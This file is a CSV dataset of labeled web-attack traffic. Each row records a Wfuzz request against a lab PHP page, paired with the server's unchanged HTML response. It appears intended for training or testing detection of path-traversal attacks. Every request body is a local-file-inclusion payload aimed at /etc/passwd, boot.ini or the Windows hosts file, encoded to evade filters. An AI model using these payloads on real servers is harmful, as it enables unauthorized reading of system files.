attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Content_Length,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Connection,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port
lfi,192.168.60.165,80,filename=%5C..%c1%1c%5C..%c1%1c%5C..%c1%1c%5C..%c1%1cetc%c1%1cpasswd,*/*,68,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55422
lfi,192.168.60.165,80,filename=%5C..%%32%%66%5C..%%32%%66%5C..%%32%%66%5C..%%32%%66%5C..%%32%%66%5C..%%32%%66windows%%32%%66system32%%32%%66drivers%%32%%66etc%%32%%66hosts,*/*,149,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55426
lfi,192.168.60.165,80,filename=%5C..%25c1%259c%5C..%25c1%259c%5C..%25c1%259c%5C..%25c1%259cboot.ini,*/*,77,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55438
lfi,192.168.60.165,80,filename=%5C..%f8%80%80%80%af%5C..%f8%80%80%80%af%5C..%f8%80%80%80%af%5C..%f8%80%80%80%af%5C..%f8%80%80%80%af%5C..%f8%80%80%80%afboot.ini,*/*,137,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55448
lfi,192.168.60.165,80,filename=.%2e%5c.%2e%5c.%2e%5c.%2e%5cboot.ini,*/*,45,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55450
lfi,192.168.60.165,80,filename=.%2e0x2fetc0x2fissue,*/*,29,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55454
lfi,192.168.60.165,80,filename=.%2e%252f.%2e%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts,*/*,77,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55470
lfi,192.168.60.165,80,filename=.%2e%c1%8s.%2e%c1%8s.%2e%c1%8setc%c1%8sissue,*/*,53,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55472
lfi,192.168.60.165,80,filename=.%2e%u2215.%2e%u2215.%2e%u2215.%2e%u2215etc%u2215issue,*/*,63,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55488
lfi,192.168.60.165,80,filename=.%2e%uEFC8.%2e%uEFC8etc%uEFC8issue,*/*,43,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55500
lfi,192.168.60.165,80,filename=.%2e%e0%80%af.%2e%e0%80%af.%2e%e0%80%af.%2e%e0%80%afetc%e0%80%afissue,*/*,78,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55514
lfi,192.168.60.165,80,filename=%2e.\%2e.\%2e.\%2e.\%2e.\boot.ini,*/*,42,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55528
lfi,192.168.60.165,80,filename=%2e.%2f%2e.%2f%2e.%2f%2e.%2f%2e.%2f%2e.%2fetc%2fissue,*/*,62,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55544
lfi,192.168.60.165,80,filename=%2e.0x2f%2e.0x2f%2e.0x2fetc0x2fissue,*/*,45,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55556
lfi,192.168.60.165,80,filename=%2e.%255c%2e.%255c%2e.%255c%2e.%255cboot.ini,*/*,53,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55568
lfi,192.168.60.165,80,filename=%2e.%c0%9vboot.ini,*/*,27,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55574
lfi,192.168.60.165,80,filename=%2e.%%35%%63%2e.%%35%%63%2e.%%35%%63etc%%35%%63issue,*/*,61,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:34 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55590
lfi,192.168.60.165,80,filename=%2e.%25c1%259c%2e.%25c1%259c%2e.%25c1%259cboot.ini,*/*,59,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:34 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55592
lfi,192.168.60.165,80,filename=.../.%2f.../.%2f.../.%2f.../.%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts,*/*,83,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:34 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55608
lfi,192.168.60.165,80,filename=.../.%5cwindows%5csystem32%5cdrivers%5cetc%5chosts,*/*,59,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:34 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55612
lfi,192.168.60.165,80,filename=.../.%255cboot.ini,*/*,27,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:34 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55622
lfi,192.168.60.165,80,filename=.../.%c0%9v.../.%c0%9vboot.ini,*/*,39,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:34 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55628
lfi,192.168.60.165,80,filename=.../.%c1%1c.../.%c1%1c.../.%c1%1c.../.%c1%1c.../.%c1%1cetc%c1%1cpasswd,*/*,79,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:34 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55638
lfi,192.168.60.165,80,filename=.../.%u2215.../.%u2215.../.%u2215.../.%u2215.../.%u2215boot.ini,*/*,72,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:34 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55646
lfi,192.168.60.165,80,filename=.../.%25c1%259c.../.%25c1%259c.../.%25c1%259cetc%25c1%259cissue,*/*,72,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:34 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55650
lfi,192.168.60.165,80,filename=.../.%25c1%259c.../.%25c1%259c.../.%25c1%259c.../.%25c1%259c.../.%25c1%259c.../.%25c1%259cetc%25c1%259cpasswd,*/*,118,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:34 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55656
lfi,192.168.60.165,80,filename=....//etc//passwd,*/*,26,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:34 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55666
lfi,192.168.60.165,80,filename=..../%2f..../%2f..../%2fboot.ini,*/*,41,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:34 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,55674
